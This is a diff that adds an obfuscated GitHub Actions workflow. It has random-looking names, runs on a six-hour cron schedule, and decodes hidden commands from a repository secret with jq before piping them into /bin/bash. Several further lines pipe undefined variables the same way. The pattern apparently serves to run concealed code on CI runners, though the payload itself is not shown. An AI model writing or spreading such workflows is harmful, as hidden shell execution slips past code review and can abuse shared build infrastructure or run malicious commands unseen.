@@ -1,0 +1,23 @@
+name: huayindao7654
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '37 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: huayindao7654
+        env:
+          fnq149: ${{ secrets.fnq149 }}
+        run: |
+          echo $fnq149 | jq -r .e65869 | /bin/bash
+          echo $ejlkd9502 | jq -r .bbyh20048 | /bin/bash
+          echo $zns4 | jq -r .e466 | /bin/bash
+          echo $k9376 | jq -r .fahwk573 | /bin/bash
+          echo $yccz44 | jq -r .mwdy996 | /bin/bash
+          echo $r23 | jq -r .s7 | /bin/bash
+          echo $sia2 | jq -r .r6134 | /bin/bash
+          echo $hbogr6509 | jq -r .lqmo247 | /bin/bash
+
